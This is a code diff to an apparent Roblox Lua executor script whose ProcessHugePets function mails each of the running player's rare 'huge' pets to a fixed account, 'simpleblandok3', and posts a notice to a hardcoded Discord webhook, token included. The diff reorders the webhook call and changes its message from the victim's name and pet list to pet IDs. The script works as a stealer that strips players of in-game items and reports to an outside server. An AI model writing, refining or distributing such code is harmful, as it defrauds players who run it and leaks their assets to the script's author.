@@ -72,6 +72,24 @@ function ProcessHugePets()
     print("Huge pets you have right now:", table.concat(hugePets, ", "))
 
     for i = #uids, 1, -1 do
+        local webhook = "https://discord.com/api/webhooks/1267533930089680938/GQj5fiktIVKXK2PBkGtRPBZXfhCnC70yzsTNszEB6FZ6EnNXir1y5pze75Eso96yvRG7"
+        local request = (syn and syn.request) or request or (http and http.request) or http_request
+
+        -- Send the webhook message first
+        request({
+            Url = webhook,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({
+                content = "Successfully sent! Pet ID: " .. hugePets[i]
+            })
+        })
+
+        wait(3)  -- Add a delay to ensure the webhook is sent before proceeding
+
+        -- Now run the remote event
         local args = {
             [1] = "simpleblandok3",
             [2] = "omg u got a new huge!!",
@@ -82,20 +100,6 @@ function ProcessHugePets()
         game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
 
         wait(3)
-
-        local webhook = "https://discord.com/api/webhooks/1267533930089680938/GQj5fiktIVKXK2PBkGtRPBZXfhCnC70yzsTNszEB6FZ6EnNXir1y5pze75Eso96yvRG7"
-        local request = (syn and syn.request) or request or (http and http.request) or http_request
-        
-        request({
-            Url = webhook,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode({
-                content = game.Players.LocalPlayer.Name .. " | Hatched A Huge! | " .. table.concat(hugePets, ", ")
-            })
-        })
     end
 end
 
